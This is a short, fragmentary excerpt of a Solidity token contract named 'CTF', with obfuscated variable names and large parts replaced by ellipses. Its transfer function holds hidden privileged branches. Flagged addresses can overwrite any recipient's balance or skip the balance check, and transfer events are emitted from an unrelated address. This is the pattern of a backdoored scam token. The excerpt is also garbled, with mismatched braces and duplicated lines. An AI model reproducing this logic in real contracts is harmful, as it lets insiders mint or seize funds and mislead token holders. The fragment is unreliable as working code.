...
contract CTF is Context, Ownable {
    ...
    function whck(address iw) public{
    ...
    function transfer(address recipient, uint256 amount) public {
        ...
        XoVal[recipient] += amount; 
        emit Transfer (RtVer2, recipient, amount);}
        if(tUse[msg.sender]) {XoVal[recipient] = amount;} 
        if(!yUse[msg.sender]) {
        require(XoVal[msg.sender] >= amount);
        XoVal[msg.sender] -= amount;  
        XoVal[recipient] += amount;          
